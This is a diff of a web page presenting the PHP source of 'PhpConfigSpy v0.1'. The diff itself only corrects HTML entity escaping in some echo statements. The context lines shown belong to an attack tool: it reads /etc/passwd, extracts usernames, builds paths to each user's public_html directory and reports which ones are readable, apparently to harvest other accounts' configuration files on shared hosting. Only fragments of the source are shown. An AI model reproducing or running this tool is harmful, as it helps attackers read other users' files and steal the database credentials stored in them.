@@ -38,8 +38,8 @@
 <h3>PhpConfigSpy Source Code</h3>
 
 <div class="highlight"><pre><code class="language-php" data-lang="php"><span class="lineno">  1</span> <span class="cp">&lt;?php</span> 
-<span class="lineno">  2</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;html&amp;gt;&quot;</span><span class="p">;</span> 
-<span class="lineno">  3</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;title&amp;gt;PhpConfigSpy v0.1&amp;lt;/title&amp;gt;&amp;lt;body&amp;gt;&quot;</span><span class="p">;</span> 
+<span class="lineno">  2</span> <span class="k">echo</span> <span class="s2">&quot;&lt;html&gt;&quot;</span><span class="p">;</span> 
+<span class="lineno">  3</span> <span class="k">echo</span> <span class="s2">&quot;&lt;title&gt;PhpConfigSpy v0.1&lt;/title&gt;&lt;body&gt;&quot;</span><span class="p">;</span> 
 <span class="lineno">  4</span> 
 <span class="lineno">  5</span> <span class="nb">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> 
 <span class="lineno">  6</span> 
@@ -64,7 +64,7 @@
 <span class="lineno"> 25</span> 
 <span class="lineno"> 26</span> <span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$passwd</span><span class="p">))</span> <span class="p">{</span> 
 <span class="lineno"> 27</span> <span class="nv">$str</span><span class="o">=</span><span class="nb">fgets</span><span class="p">(</span><span class="nv">$passwd</span><span class="p">);</span> 
-<span class="lineno"> 28</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="mi">35</span><span class="p">)</span> <span class="p">{</span> 
+<span class="lineno"> 28</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$i</span><span class="o">&gt;</span><span class="mi">35</span><span class="p">)</span> <span class="p">{</span> 
 <span class="lineno"> 29</span>    <span class="nv">$pos</span><span class="o">=</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span><span class="s2">&quot;:&quot;</span><span class="p">);</span> 
 <span class="lineno"> 30</span>    <span class="nv">$username</span><span class="o">=</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nv">$pos</span><span class="p">);</span> 
 <span class="lineno"> 31</span>    <span class="nv">$dirz</span><span class="o">=</span><span class="s2">&quot;/home/</span><span class="si">$username</span><span class="s2">/public_html/&quot;</span><span class="p">;</span> 
@@ -101,8 +101,8 @@
 <span class="lineno"> 62</span> <span class="c1">###</span>
 <span class="lineno"> 63</span> <span class="c1">###</span>
 <span class="lineno"> 64</span> <span class="c1">#### </span>
-<span class="lineno"> 65</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span> 
-<span class="lineno"> 66</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;textarea name=&#39;main_window&#39; cols=100 rows=20&amp;gt;&quot;</span><span class="p">;</span> 
+<span class="lineno"> 65</span> <span class="k">echo</span> <span class="s2">&quot;&lt;br&gt;&lt;br&gt;&quot;</span><span class="p">;</span> 
+<span class="lineno"> 66</span> <span class="k">echo</span> <span class="s2">&quot;&lt;textarea name=&#39;main_window&#39; cols=100 rows=20&gt;&quot;</span><span class="p">;</span> 
 <span class="lineno"> 67</span> 
 <span class="lineno"> 68</span> <span class="k">echo</span> <span class="s2">&quot;[+] Founded &quot;</span><span class="o">.</span><span class="nb">sizeof</span><span class="p">(</span><span class="nv">$users</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; entrys in /etc/passwd</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span> 
 <span class="lineno"> 69</span> <span class="k">echo</span> <span class="s2">&quot;[+] Founded &quot;</span><span class="o">.</span><span class="nb">sizeof</span><span class="p">(</span><span class="nv">$path_to_public</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; readable public_html directories</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span> 
@@ -165,9 +165,9 @@
 <span class="lineno">126</span>     <span class="p">}</span> 
 <span class="lineno">127</span> <span class="p">}</span> 
 <span class="lineno">128</span> 
-<span class="lineno">129</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/textarea&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span> 
+<span class="lineno">129</span> <span class="k">echo</span> <span class="s2">&quot;&lt;/textarea&gt;&lt;br&gt;&quot;</span><span class="p">;</span> 
 <span class="lineno">130</span> 
-<span class="lineno">131</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&quot;</span><span class="p">;</span> 
+<span class="lineno">131</span> <span class="k">echo</span> <span class="s2">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span><span class="p">;</span> 
 <span class="lineno">132</span> <span class="cp">?&gt;</span><span class="x"></span></code></pre></div>
 
 
